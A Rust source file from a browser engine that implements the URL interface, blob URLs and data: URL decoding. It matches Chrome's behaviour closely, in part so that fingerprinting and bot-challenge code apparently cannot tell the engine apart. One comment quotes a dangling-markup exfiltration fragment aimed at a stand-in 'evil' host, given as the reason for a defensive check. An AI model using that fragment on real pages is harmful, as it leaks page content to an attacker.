//! `modules/url/url.rs` — `URL`, from ONE table.
//!
//! WAS FOUR PLACES, and the only interface of the goal whose class lived in the KERNEL:
//!   * `core/korvus-runtime/src/lib.rs` — the cppgc class `JsUrl`, an `#[op2] impl` with twelve
//!     accessors, registered in the runtime extension's `objects = [...]` list;
//!   * `core/korvus-runtime/src/js/host.js` — `globalThis.URL = JsUrl`, the `.name` fixup, the
//!     `Symbol.toPrimitive` decoration, the four statics assigned onto the class from
//!     `korvus-runtime/src/natives.rs`, the two JS `Map`s behind `createObjectURL`, and finally a
//!     **`Proxy`** replacing the global whose `construct` trap stringified object arguments, because
//!     the op2 `#[string]` parameter does not coerce a JS object;
//!   * `core/korvus-webapi/src/js/dom/08g-observers.js` — `toString`/`toJSON`/`searchParams`, and a
//!     raw-callback `href` setter over the captured native one (`KB.__urlHrefNativeSet`);
//!   * `core/korvus-runtime/src/natives.rs` — the four statics' bodies.
//!
//! IS NOW the [`URL`] table at the bottom of this file, mounted by
//! `install::live::install_window_url` / `install_worker_url` in BOTH realms. The constructor row
//! is a REAL Rust constructor ([`cb_url_ctor`]) that does the WHATWG `USVString` coercion itself,
//! which is what deletes the Proxy: rows 6 and 7 of the brief's twelve probes (`new URL(urlObject)`
//! and `new URL(anchorElement)`) are exactly what the Proxy existed for, and they are gated in
//! `core/korvus-runtime/tests/url_live.rs`.
//!
//! The WORKER realm had NO working `URL` at all before this lane: the class was never assigned onto
//! a worker global, so `new URL("https://a/").href` answered `undefined` off the generated worker
//! registry's D2 stub (measured at master). Same table, both realms, invariant I8.

use deno_core::{v8, CppgcBase};
use macros::webapi;

use crate::binding::protos::{get_prop, str_val, throw_type_error};
use crate::install::live::{getter_row, method_row, pair_row, set_table_proto};
use crate::install::MemberDef;
use super::components;

/// The WHATWG URL record. Was `JsUrl` in `core/korvus-runtime/src/lib.rs`; the parse and every
/// component body below is that class's, moved verbatim.
#[repr(C)]
#[derive(CppgcBase)]
pub struct Url {
    inner: std::cell::RefCell<url::Url>,
}

/// One component of a `URL` object read from its Rust URL, for ENGINE code: a frame's
/// `Location` is backed by a `URL`, and reading it through the page-visible `URL.prototype` getters let a
/// page that wraps them watch the engine read every frame's location. `None` when `o` is not a `URL`.
pub(crate) fn native_component(scope: &mut v8::PinScope, o: v8::Local<v8::Object>, key: &str) -> Option<String> {
    let v: v8::Local<v8::Value> = o.into();
    let u = deno_core::cppgc::try_unwrap_cppgc_object::<Url>(scope, v)?;
    let u = unsafe { u.as_ref() }.inner.borrow();
    Some(match key {
        "href" => url::quirks::href(&u).to_string(),
        "origin" => url::quirks::origin(&u),
        "protocol" => url::quirks::protocol(&u).to_string(),
        "host" => url::quirks::host(&u).to_string(),
        "hostname" => url::quirks::hostname(&u).to_string(),
        "port" => url::quirks::port(&u).to_string(),
        "pathname" => url::quirks::pathname(&u).to_string(),
        "search" => url::quirks::search(&u).to_string(),
        "hash" => url::quirks::hash(&u).to_string(),
        _ => return None,
    })
}

pub(crate) trait UrlBehavior {
    fn construct(_input: &str, _base: Option<&str>) -> Result<Url, UrlError> where Self: Sized { stub!("URL::constructor") }
}

/// Which half of `new URL(input, base)` failed — Chrome reports the two differently
/// ("Failed to construct 'URL': Invalid URL" vs "... Invalid base URL", measured).
pub(crate) enum UrlError {
    Input,
    Base,
}

#[webapi(base, own, name = "URL")]
impl Url {
    #[constructor]
    #[cppgc]
    fn constructor() -> Result<Url, ::deno_error::JsErrorBox> {
        Err(::deno_error::JsErrorBox::type_error("Illegal constructor"))
    }
}

impl UrlBehavior for Url {
    /// WHATWG: a provided base is parsed unconditionally; only an ABSENT base means "no base".
    ///
    /// Both parses are Chrome's (`super::gurl`): `filesystem:` URLs and the schemes Chrome
    /// registers as standard are Chromium's URL library's, everything else the spec's -- so
    /// `new URL("filesystem:///default.ini")` throws "Invalid URL" as Chrome's does (a fingerprinting library reads it).
    fn construct(input: &str, base: Option<&str>) -> Result<Url, UrlError> {
        let parsed = match base {
            Some(b) => {
                let b = super::gurl::parse(b).ok_or(UrlError::Base)?;
                super::gurl::join(&b, input)
            }
            None => super::gurl::parse(input),
        };
        parsed.map(|inner| Url { inner: std::cell::RefCell::new(inner) }).ok_or(UrlError::Input)
    }
}


// ── the receiver, and the two coercions every row shares ────────────────────────────────────────

/// The WebIDL receiver check: a call whose `this` is not a `URL` throws Chrome's
/// `TypeError: Illegal invocation` (measured for `href`, `protocol`, `toString`, `toJSON` and
/// `searchParams`). At master the cppgc accessors threw `TypeError: expected JsUrl` (op2's own
/// message, which named the Rust struct to the page) and the three JS-mounted members answered
/// `undefined` or minted an empty `URLSearchParams`.
fn url_recv(scope: &mut v8::PinScope, this: v8::Local<v8::Value>) -> bool {
    if deno_core::cppgc::try_unwrap_cppgc_object::<Url>(scope, this).is_some() {
        return true;
    }
    throw_type_error(scope, "Illegal invocation");
    false
}

/// Read a component off the receiver, or throw `Illegal invocation`. `None` means an exception is
/// pending and the caller must return at once.
fn with_url<R>(scope: &mut v8::PinScope, this: v8::Local<v8::Value>, f: impl FnOnce(&url::Url) -> R) -> Option<R> {
    match deno_core::cppgc::try_unwrap_cppgc_object::<Url>(scope, this) {
        Some(u) => Some(f(&unsafe { u.as_ref() }.inner.borrow())),
        None => {
            throw_type_error(scope, "Illegal invocation");
            None
        }
    }
}

/// Mutate the receiver's record, or throw `Illegal invocation`.
fn with_url_mut(scope: &mut v8::PinScope, this: v8::Local<v8::Value>, f: impl FnOnce(&mut url::Url)) {
    match deno_core::cppgc::try_unwrap_cppgc_object::<Url>(scope, this) {
        Some(u) => f(&mut unsafe { u.as_ref() }.inner.borrow_mut()),
        None => throw_type_error(scope, "Illegal invocation"),
    }
}

/// WebIDL `USVString` conversion — `ToString(value)`, which invokes a `toString` on any object.
///
/// THIS IS WHAT REPLACES THE PROXY. `JsUrl::new` took `#[string] input: String`, and op2's string
/// conversion does not call a cppgc object's stringifier, so `new URL(anotherUrl)` and
/// `new URL(anchorElement)` did not work without the `host.js` `Proxy` whose `construct` trap
/// pre-stringified object arguments. A raw callback sees the raw `Local<Value>` and can do the
/// conversion itself, which is both the spec's order and one fewer layer. `None` means the
/// stringifier threw and the exception is already pending.
fn usv(scope: &mut v8::PinScope, v: v8::Local<v8::Value>) -> Option<String> {
    let s = v.to_string(scope)?;
    Some(s.to_rust_string_lossy(scope))
}

/// The `(input, base)` pair of the constructor and of `canParse`/`parse`, coerced.
///
/// `base` is absent only when the argument is genuinely missing or `undefined`; `null` becomes the
/// string `"null"` and therefore an "Invalid base URL" TypeError, exactly as Chrome does (measured:
/// `new URL("https://e.example/x", null)` throws there and answered the input's href here).
/// `Err(())` means a stringifier threw and the exception is pending.
fn url_args(scope: &mut v8::PinScope, args: &v8::FunctionCallbackArguments) -> Result<(String, Option<String>), ()> {
    let input = usv(scope, args.get(0)).ok_or(())?;
    let raw_base = args.get(1);
    let base = if args.length() < 2 || raw_base.is_undefined() {
        None
    } else {
        Some(usv(scope, raw_base).ok_or(())?)
    };
    Ok((input, base))
}

// ── the constructor row ─────────────────────────────────────────────────────────────────────────

/// `new URL(input[, base])` — the real Rust constructor the table's `ctor` row names, and the
/// deletion of `host.js`'s `Proxy`.
///
/// Error messages are Chrome's, measured over loopback: the arity message, the "use the 'new'
/// operator" message for a call without `new`, "Invalid URL" and "Invalid base URL". At master the
/// last two read `url` crate text ("Invalid URL: relative URL without a base") and the no-`new` call
/// produced a *circular-structure JSON* error, because the Proxy's `construct` trap was never reached
/// and the cppgc class was invoked as a function.
pub fn cb_url_ctor(scope: &mut v8::PinScope, args: v8::FunctionCallbackArguments, mut rv: v8::ReturnValue) {
    if !args.new_target().is_object() {
        throw_type_error(scope, &crate::binding::protos::use_new_msg("URL"));
        return;
    }
    if args.length() < 1 {
        throw_type_error(scope, "Failed to construct 'URL': 1 argument required, but only 0 present.");
        return;
    }
    let Ok((input, base)) = url_args(scope, &args) else { return };
    let built = match <Url as UrlBehavior>::construct(&input, base.as_deref()) {
        Ok(u) => u,
        Err(UrlError::Input) => {
            throw_type_error(scope, "Failed to construct 'URL': Invalid URL");
            return;
        }
        Err(UrlError::Base) => {
            throw_type_error(scope, "Failed to construct 'URL': Invalid base URL");
            return;
        }
    };
    // Nothing below may run with an exception pending: a V8 call swallows it (learned in the
    // URLSearchParams half of this lane).
    let obj = crate::binding::class::mint(scope, built);
    // A subclass (`class S extends URL`) lands on ITS prototype; the plain call lands on the TABLE's,
    // never on the cppgc class template's (the brief's failure mode 1).
    let proto = v8::Local::<v8::Object>::try_from(args.new_target())
        .ok()
        .and_then(|nt| get_prop(scope, nt, "prototype"))
        .and_then(|v| v8::Local::<v8::Object>::try_from(v).ok());
    match proto {
        Some(p) => { obj.set_prototype(scope, p.into()); }
        None => set_table_proto(scope, obj, "URL"),
    }
    rv.set(obj.into());
}

// ── the component rows (moved verbatim from `JsUrl`'s `#[op2] impl`) ────────────────────────────

macro_rules! url_get {
    ($cb:ident, |$u:ident| $body:block) => {
        fn $cb(scope: &mut v8::PinScope, args: v8::FunctionCallbackArguments, mut rv: v8::ReturnValue) {
            let Some(s) = with_url(scope, args.this().into(), |$u| $body) else { return };
            let v = str_val(scope, &s);
            rv.set(v);
        }
    };
}

// EVERY BODY BELOW IS `super::components`, WHICH IS `url::quirks`, WHICH IS THE SPEC. They were
// hand-rolled here and hand-rolled AGAIN in `core/html/hyperlink.rs`; see that module's header for
// what the two copies each got wrong.
url_get!(cb_url_href_get, |u| { components::href(u) });
url_get!(cb_url_protocol_get, |u| { components::protocol(u) });
url_get!(cb_url_hostname_get, |u| { components::hostname(u) });
url_get!(cb_url_port_get, |u| { components::port(u) });
url_get!(cb_url_username_get, |u| { components::username(u) });
url_get!(cb_url_password_get, |u| { components::password(u) });
url_get!(cb_url_origin_get, |u| { components::origin(u) });
url_get!(cb_url_pathname_get, |u| { components::pathname(u) });
url_get!(cb_url_host_get, |u| { components::host(u) });
url_get!(cb_url_search_get, |u| { components::search(u) });
url_get!(cb_url_hash_get, |u| { components::hash(u) });

/// `set href` — the ONE setter that throws. Chrome: "Failed to set the 'href' property on 'URL':
/// Invalid URL" (brief probe 10, measured identical before and after this lane). At master this was
/// a raw callback in `dom/08g-observers.js` that asked `URL.canParse` and then called the captured
/// native op2 setter through the `KB.__urlHrefNativeSet` bridge slot; both go.
fn cb_url_href_set(scope: &mut v8::PinScope, args: v8::FunctionCallbackArguments, _rv: v8::ReturnValue) {
    let this: v8::Local<v8::Value> = args.this().into();
    if !url_recv(scope, this) { return; }
    let Some(value) = usv(scope, args.get(0)) else { return };
    match super::gurl::parse(&value) {
        Some(parsed) => with_url_mut(scope, this, |u| *u = parsed),
        None => throw_type_error(scope, "Failed to set the 'href' property on 'URL': Invalid URL"),
    }
}

macro_rules! url_set {
    ($cb:ident, |$u:ident, $v:ident| $body:block) => {
        fn $cb(scope: &mut v8::PinScope, args: v8::FunctionCallbackArguments, _rv: v8::ReturnValue) {
            let this: v8::Local<v8::Value> = args.this().into();
            if !url_recv(scope, this) { return; }
            let Some($v) = usv(scope, args.get(0)) else { return };
            with_url_mut(scope, this, |$u| $body);
        }
    };
}

url_set!(cb_url_protocol_set, |u, value| { components::set_protocol(u, &value); });
url_set!(cb_url_hostname_set, |u, value| { components::set_hostname(u, &value); });
url_set!(cb_url_username_set, |u, value| { components::set_username(u, &value); });
url_set!(cb_url_password_set, |u, value| { components::set_password(u, &value); });
url_set!(cb_url_pathname_set, |u, value| { components::set_pathname(u, &value); });
url_set!(cb_url_search_set, |u, value| { components::set_search(u, &value); });
url_set!(cb_url_hash_set, |u, value| { components::set_hash(u, &value); });
url_set!(cb_url_port_set, |u, value| { components::set_port(u, &value); });
url_set!(cb_url_host_set, |u, value| { components::set_host(u, &value); });

/// `toString()` / `toJSON()` — the stringifier, both returning `href`.
fn cb_url_href_str(scope: &mut v8::PinScope, args: v8::FunctionCallbackArguments, mut rv: v8::ReturnValue) {
    let Some(s) = with_url(scope, args.this().into(), |u| u.as_str().to_string()) else { return };
    let v = str_val(scope, &s);
    rv.set(v);
}

/// `get searchParams` — the live `URLSearchParams` view, minted once per URL and cached on a v8
/// Private (so `u.searchParams === u.searchParams`, which Chrome guarantees).
///
/// At master this minted through `globalThis.URLSearchParams` and linked the two through the
/// `KB.__uspBind` bridge slot; both sides are Rust now, so it mints the cppgc object directly onto
/// the table's prototype and calls the binder. That also makes it immune to a page that replaces
/// `globalThis.URLSearchParams` -- which is what Chrome does.
fn cb_url_search_params(scope: &mut v8::PinScope, args: v8::FunctionCallbackArguments, mut rv: v8::ReturnValue) {
    let this = args.this();
    if !url_recv(scope, this.into()) { return; }
    let Some(pname) = v8::String::new(scope, "korvus_url_sp") else { return };
    let key = v8::Private::for_api(scope, Some(pname));
    if let Some(cached) = this.get_private(scope, key) {
        if !cached.is_undefined() {
            rv.set(cached);
            return;
        }
    }
    let p = super::url_search_params::mint_empty(scope);
    super::url_search_params::bind(scope, p.into(), this);
    let pv: v8::Local<v8::Value> = p.into();
    this.set_private(scope, key, pv);
    rv.set(pv);
}

// ── the four statics (moved from `core/korvus-runtime/src/natives.rs`) ──────────────────────────

/// `URL.canParse(input[, base])` — `true` iff the pair parses. Was a native in `natives.rs` that
/// constructed through the RAW `JsUrl` to dodge the Proxy; there is no Proxy now, and the parse is
/// the same `UrlBehavior::construct` the constructor row uses.
fn cb_url_can_parse(scope: &mut v8::PinScope, args: v8::FunctionCallbackArguments, mut rv: v8::ReturnValue) {
    let Ok((input, base)) = url_args(scope, &args) else { return };
    rv.set_bool(<Url as UrlBehavior>::construct(&input, base.as_deref()).is_ok());
}

/// `URL.parse(input[, base])` — the URL, or `null`. Same parse, same coercion.
fn cb_url_parse(scope: &mut v8::PinScope, args: v8::FunctionCallbackArguments, mut rv: v8::ReturnValue) {
    let Ok((input, base)) = url_args(scope, &args) else { return };
    match <Url as UrlBehavior>::construct(&input, base.as_deref()) {
        Ok(u) => {
            let obj = crate::binding::class::mint(scope, u);
            set_table_proto(scope, obj, "URL");
            rv.set(obj.into());
        }
        Err(_) => rv.set_null(),
    }
}

/// The blob-URL registry: the serial, the object handed to `createObjectURL`, and the text of a
/// `Blob`'s bytes.
///
/// RULING — this MOVED to Rust rather than staying two JS `Map`s, and why. The maps stayed in JS
/// because `host.js`'s `resolveWorkerSource` reads `KB.__blobUrlContents` SYNCHRONOUSLY to hand a
/// `blob:` Worker its source, and only the serial counter had moved (`natives::BlobUrlSeq`). Once the
/// statics became table rows there was no JS left to own or hand over the maps, so the choice was to
/// keep a bridge slot alive for them -- the mechanism invariant I3 deletes -- or move the registry and
/// give the two readers a synchronous Rust reader. Moved: [`blob_url_text`] is that reader --
/// `core/workers/worker.rs::worker_source` and `core/html/browsing_context.rs::blob_text` both call
/// it directly. (It carried an `op_blob_url_text` door for a JS caller; the JS is gone and the op
/// with it.) Cost if wrong: a blob
/// URL minted in one realm is invisible in another, which was already true of the per-realm JS Maps.
#[derive(Default)]
pub struct BlobUrlRegistry {
    objects: std::cell::RefCell<std::collections::HashMap<String, v8::Global<v8::Value>>>,
    text: std::cell::RefCell<std::collections::HashMap<String, String>>,
    /// The blob's type and bytes, for the loaders that answer a `blob:` URL without a scope (img, script,
    /// fetch). `text` stays for the frame/worker paths that read a document or a script.
    bytes: BlobBytes,
}

/// An isolate's blob URLs end with it: the process's store forgets every URL this registry minted. HTML's
/// unloading-document cleanup and Chrome's `PublicURLManager::ContextDestroyed` revoke the URLs a context
/// registered when the context goes. Chrome 150, measured: a page's `fetch()` of a URL its worker minted reads
/// the bytes while the worker runs and fails with `TypeError` once the worker is terminated.
impl Drop for BlobUrlRegistry {
    fn drop(&mut self) {
        if let Ok(mut m) = shared_blobs().lock() {
            for k in self.objects.get_mut().keys() {
                m.remove(k);
            }
        }
    }
}

/// The `blob:` URL -> (type, bytes) map, shared by `Rc` with the module loader (`import(blobURL)`
/// resolves through a loader that has no scope to ask).
pub type BlobBytes = std::rc::Rc<std::cell::RefCell<std::collections::HashMap<String, (String, std::sync::Arc<Vec<u8>>)>>>;

/// This realm's blob bytes, for a loader that must answer `blob:` without a scope.
pub fn blob_bytes_handle(state: &deno_core::OpState) -> Option<BlobBytes> {
    state.try_borrow::<BlobUrlRegistry>().map(|r| r.bytes.clone())
}

/// The type and bytes a `blob:` URL was minted for, or `None` if it was never minted or was revoked.
pub fn blob_url_bytes(state: &deno_core::OpState, href: &str) -> Option<(String, std::sync::Arc<Vec<u8>>)> {
    let key = href.split('#').next().unwrap_or(href);
    let own = state.try_borrow::<BlobUrlRegistry>().and_then(|r| r.bytes.borrow().get(key).cloned());
    own.or_else(|| shared_blob_bytes(key))
}

/// Does `href` name an object that is NOT a Blob -- a `MediaSource` handed to `createObjectURL` (MSE's
/// overload)? Such a URL has no bytes to fetch: a media element ATTACHES the object instead.
pub fn blob_url_names_non_blob(state: &deno_core::OpState, href: &str) -> bool {
    let Some(r) = state.try_borrow::<BlobUrlRegistry>() else { return false };
    let key = href.split('#').next().unwrap_or(href);
    r.objects.borrow().contains_key(key) && !r.bytes.borrow().contains_key(key)
}

/// The object a `blob:` URL was minted for (a `MediaSource` for MSE's overload), or `None`.
pub fn blob_url_object<'s>(scope: &mut v8::PinScope<'s, '_>, href: &str) -> Option<v8::Local<'s, v8::Value>> {
    let key = href.split('#').next().unwrap_or(href).to_string();
    let g = {
        let op_state = deno_core::JsRuntime::op_state_from(scope);
        let st = op_state.borrow();
        st.try_borrow::<BlobUrlRegistry>().and_then(|r| r.objects.borrow().get(&key).cloned())
    }?;
    Some(v8::Local::new(scope, &g))
}

fn with_registry<R>(scope: &mut v8::PinScope, f: impl FnOnce(&BlobUrlRegistry) -> R) -> R {
    let op_state = deno_core::JsRuntime::op_state_from(scope);
    let op_state = op_state.borrow();
    f(op_state.borrow::<BlobUrlRegistry>())
}

/// The text a `blob:` URL's Blob holds, or `None`. The synchronous read `host.js`'s
/// `resolveWorkerSource` needs, and the one `core/html/browsing_context.rs` needs for
/// `<iframe src="blob:...">`.
pub fn blob_url_text(scope: &mut v8::PinScope, href: &str) -> Option<String> {
    with_registry(scope, |r| r.text.borrow().get(href).cloned()).or_else(|| shared_blob_text(href))
}

/// `URL.createObjectURL(obj)` — mint `blob:<origin>/<uuid>`, keep the object, and cache the decoded text
/// of its bytes when it has any (a Blob keeps them as `_bytes`). The text cache is what makes a
/// `blob:` Worker and a `blob:` iframe resolvable without an async FileReader round-trip; a failure to
/// decode is simply "no cached text", exactly as the deleted JS's `try {} catch {}` made it.
fn cb_url_create_object_url(scope: &mut v8::PinScope, args: v8::FunctionCallbackArguments, mut rv: v8::ReturnValue) {
    // Chrome's shape: `blob:<serialized origin of the realm>/<v4 UUID>`, `blob:null/<uuid>` for an opaque
    // origin. The old `blob:nodedata:<n>` was a string no browser mints.
    // the realm's own origin (its `self.origin` getter as sealed), never what a page assigned to the
    // `[Replaceable]` name
    let origin = crate::binding::protos::realm_self_get(scope, "origin").map(|v| v.to_rust_string_lossy(scope)).filter(|o| !o.is_empty()).unwrap_or_else(|| "null".to_string());
    let id = format!("blob:{origin}/{}", v4_uuid());
    let obj = args.get(0);
    let text = blob_text_of(scope, obj);
    let bytes = crate::core::fileapi::blob::blob_bytes(scope, obj);
    // The Blob's own type slot, never its `type` getter: a page that wraps `Blob.prototype.type` must
    // not see the engine read it (Chrome's createObjectURL reads the blob's internal data).
    let ty = crate::core::fileapi::blob::blob_type(scope, obj).unwrap_or_default();
    let g = v8::Global::new(scope, obj);
    let bytes = bytes.map(std::sync::Arc::new);
    shared_blobs_insert(&id, text.clone(), bytes.clone().map(|b| (ty.clone(), b)));
    with_registry(scope, |r| {
        r.objects.borrow_mut().insert(id.clone(), g);
        if let Some(t) = text {
            r.text.borrow_mut().insert(id.clone(), t);
        }
        if let Some(b) = bytes {
            r.bytes.borrow_mut().insert(id.clone(), (ty, b));
        }
    });
    let v = str_val(scope, &id);
    rv.set(v);
}

/// THE PROCESS'S blob URL store: every `blob:` URL any realm of this process minted, by URL -- its text and
/// its type and bytes. A blob URL store is the user agent's, not a realm's: a page's `blob:` URL starts a
/// worker, and that worker's `new Worker(sameUrl)` loads the same blob from another isolate. Chrome 150,
/// measured: a worker handed its page's blob URL starts it (`inner from page blob ok`); korvus's per-isolate
/// registry answered "Failed to fetch". a bot-challenge frame and its nested workers start one blob
/// URL from several realms. Each realm's own registry stays the first answer (it holds the live object);
/// this is the fallback. `revokeObjectURL` removes from both, and an isolate's end removes every URL it
/// minted (`Drop for BlobUrlRegistry`).
type SharedBlob = (Option<String>, Option<(String, std::sync::Arc<Vec<u8>>)>);
fn shared_blobs() -> &'static std::sync::Mutex<std::collections::HashMap<String, SharedBlob>> {
    static S: std::sync::OnceLock<std::sync::Mutex<std::collections::HashMap<String, SharedBlob>>> = std::sync::OnceLock::new();
    S.get_or_init(Default::default)
}

fn shared_blobs_insert(id: &str, text: Option<String>, bytes: Option<(String, std::sync::Arc<Vec<u8>>)>) {
    if text.is_none() && bytes.is_none() {
        return;
    }
    if let Ok(mut m) = shared_blobs().lock() {
        m.insert(id.to_string(), (text, bytes));
    }
}

fn shared_blob_text(href: &str) -> Option<String> {
    let key = href.split('#').next().unwrap_or(href);
    shared_blobs().lock().ok()?.get(key).and_then(|b| b.0.clone())
}

/// The type and bytes of a `blob:` URL any realm of this process minted -- for a loader that holds its own
/// realm's map ([`blob_bytes_handle`]) and has no `OpState` to ask: a worker's `import(pageBlobUrl)`.
pub fn shared_blob_bytes(href: &str) -> Option<(String, std::sync::Arc<Vec<u8>>)> {
    let key = href.split('#').next().unwrap_or(href);
    shared_blobs().lock().ok()?.get(key).and_then(|b| b.1.clone())
}

/// The UTF-8 text of a `Blob`, or `None` for anything else. The deleted JS ran
/// `new TextDecoder().decode(obj._bytes)`; this is the same lossy UTF-8 decode in Rust, with the BOM
/// stripped exactly as `TextDecoder` does.
///
/// The bytes come from `core/fileapi/blob.rs`'s ONE reader over the blob's internal slots.
/// It used to be `get_prop(o, "_bytes")`, an own property the JS class left on every instance, so any
/// object carrying a typed array under that name was accepted as a blob.
fn blob_text_of(scope: &mut v8::PinScope, obj: v8::Local<v8::Value>) -> Option<String> {
    let buf = crate::core::fileapi::blob::blob_bytes(scope, obj)?;
    let s = String::from_utf8_lossy(&buf).into_owned();
    Some(s.strip_prefix('\u{feff}').map(|t| t.to_string()).unwrap_or(s))
}

/// `URL.revokeObjectURL(id)` — drop both entries. `id` is stringified (WebIDL `DOMString`); the
/// deleted JS did not stringify, but a non-string simply matched no key there either.
fn cb_url_revoke_object_url(scope: &mut v8::PinScope, args: v8::FunctionCallbackArguments, _rv: v8::ReturnValue) {
    let Some(id) = usv(scope, args.get(0)) else { return };
    if let Ok(mut m) = shared_blobs().lock() {
        m.remove(&id);
    }
    with_registry(scope, |r| {
        r.objects.borrow_mut().remove(&id);
        r.text.borrow_mut().remove(&id);
        r.bytes.borrow_mut().remove(&id);
    });
}

fn v4_uuid() -> String {
    let mut b = [0u8; 16];
    let _ = getrandom::getrandom(&mut b);
    b[6] = (b[6] & 0x0f) | 0x40;
    b[8] = (b[8] & 0x3f) | 0x80;
    format!(
        "{:02x}{:02x}{:02x}{:02x}-{:02x}{:02x}-{:02x}{:02x}-{:02x}{:02x}-{:02x}{:02x}{:02x}{:02x}{:02x}{:02x}",
        b[0], b[1], b[2], b[3], b[4], b[5], b[6], b[7], b[8], b[9], b[10], b[11], b[12], b[13], b[14], b[15]
    )
}

/// Chromium's POTENTIALLY DANGLING MARKUP mark on a URL string, `url_canon_etc.cc`'s `DoRemoveUrlWhitespace`:
/// the parser removed a tab, CR or LF from `raw`, and `raw` has a `<`. A `data:` URL is never marked, because the
/// remover leaves it whole. An http(s) request for a marked URL is refused: `BaseFetchContext::CanRequest`
/// (`base_fetch_context.cc`: after CSP and mixed content) refuses every subresource and `fetch()`, and
/// `FrameLoader::StartNavigation` drops a navigation. Markup an attacker left unclosed (`<img src='https://evil/?`)
/// swallows the page's text up to the next quote, newlines and a `<` included. korvus refused none of it (WPT
/// `fetch/security/dangling-markup/dangling-markup-mitigation.tentative.html`, which Chrome passes).
pub(crate) fn potentially_dangling_markup(raw: &str) -> bool {
    raw.bytes().any(|b| matches!(b, b'\t' | b'\n' | b'\r')) && !(raw.len() > 5 && raw.starts_with("data:")) && raw.contains('<')
}

/// Decode a `data:` URL (Fetch §4.2 "data: URL processor"): its MIME type (defaulting to
/// `text/plain;charset=US-ASCII`) and its body bytes. `None` when it is not a valid `data:` URL.
pub fn decode_data_url(url: &str) -> Option<(String, Vec<u8>)> {
    let rest = url.get(..5).filter(|p| p.eq_ignore_ascii_case("data:")).map(|_| &url[5..])?;
    let rest = rest.split('#').next().unwrap_or("");
    let (meta, data) = rest.split_once(',')?;
    let mut bytes: Vec<u8> = percent_encoding::percent_decode_str(data).collect();
    let meta = meta.trim_matches(|c: char| c.is_ascii_whitespace());
    let (mime, is_b64) = match meta.len().checked_sub(7).map(|i| (&meta[..i], &meta[i..])) {
        Some((head, tail)) if tail.eq_ignore_ascii_case(";base64") => (head.trim_end_matches([' ', '\t']).to_string(), true),
        _ => (meta.to_string(), false),
    };
    if is_b64 {
        use base64::Engine as _;
        let cleaned: Vec<u8> = bytes.iter().copied().filter(|b| !b.is_ascii_whitespace()).collect();
        let cleaned = if cleaned.len() % 4 == 0 { cleaned.strip_suffix(b"==").or_else(|| cleaned.strip_suffix(b"=")).map(<[u8]>::to_vec).unwrap_or(cleaned) } else { cleaned };
        bytes = base64::engine::general_purpose::STANDARD_NO_PAD.decode(&cleaned).ok()?;
    }
    let mime = if mime.is_empty() || mime.starts_with(';') { format!("text/plain{}", if mime.is_empty() { ";charset=US-ASCII".to_string() } else { mime }) } else { mime };
    Some((mime, bytes))
}

// ── The interface, from ONE table ───────────────────────────────────────────────

/// The body every row of [`URL`] names. Statics land on the interface object, instance members on the
/// prototype; `put_member` hands each the right target.
pub fn install_url(scope: &mut v8::PinScope, target: v8::Local<v8::Object>, member: &'static MemberDef) {
    match member.name {
        "origin" => getter_row(scope, target, member, cb_url_origin_get),
        "protocol" => pair_row(scope, target, member, cb_url_protocol_get, cb_url_protocol_set),
        "username" => pair_row(scope, target, member, cb_url_username_get, cb_url_username_set),
        "password" => pair_row(scope, target, member, cb_url_password_get, cb_url_password_set),
        "host" => pair_row(scope, target, member, cb_url_host_get, cb_url_host_set),
        "hostname" => pair_row(scope, target, member, cb_url_hostname_get, cb_url_hostname_set),
        "port" => pair_row(scope, target, member, cb_url_port_get, cb_url_port_set),
        "pathname" => pair_row(scope, target, member, cb_url_pathname_get, cb_url_pathname_set),
        "search" => pair_row(scope, target, member, cb_url_search_get, cb_url_search_set),
        "searchParams" => getter_row(scope, target, member, cb_url_search_params),
        "hash" => pair_row(scope, target, member, cb_url_hash_get, cb_url_hash_set),
        "href" => pair_row(scope, target, member, cb_url_href_get, cb_url_href_set),
        "toJSON" => method_row(scope, target, member, cb_url_href_str),
        "toString" => method_row(scope, target, member, cb_url_href_str),
        "canParse" => method_row(scope, target, member, cb_url_can_parse),
        "parse" => method_row(scope, target, member, cb_url_parse),
        "createObjectURL" => method_row(scope, target, member, cb_url_create_object_url),
        "revokeObjectURL" => method_row(scope, target, member, cb_url_revoke_object_url),
        other => debug_assert!(false, "install_url: unexpected member {other}"),
    }
}

// Rows VERBATIM from the `URL` block of `install/generated_registry.rs` (identical to
// `generated_worker_registry.rs`'s but for `exposed`), in the capture's order.
webapi::interface! {
    "URL" [value, both] {
        ctor          "URL"               len 1                      = stub,
        attr   "origin"          : Object readonly                    = install_url,
        attr   "protocol"        : Object                             = install_url,
        attr   "username"        : Object                             = install_url,
        attr   "password"        : Object                             = install_url,
        attr   "host"            : Object                             = install_url,
        attr   "hostname"        : Object                             = install_url,
        attr   "port"            : Object                             = install_url,
        attr   "pathname"        : Object                             = install_url,
        attr   "search"          : Object                             = install_url,
        attr   "searchParams"    : Object readonly                    = install_url,
        attr   "hash"            : Object                             = install_url,
        attr   "href"            : Object                             = install_url,
        method "toJSON"          : Object len 0                       = install_url,
        method "toString"        : Object len 0                       = install_url,
        static_method "canParse"        : Object len 1 required 1     = install_url,
        static_method "parse"           : Object len 1 required 1 nullable = install_url,
        static_method "createObjectURL" : Object len 1 required 1     = install_url,
        static_method "revokeObjectURL" : Object len 1 required 1     = install_url
    }
}
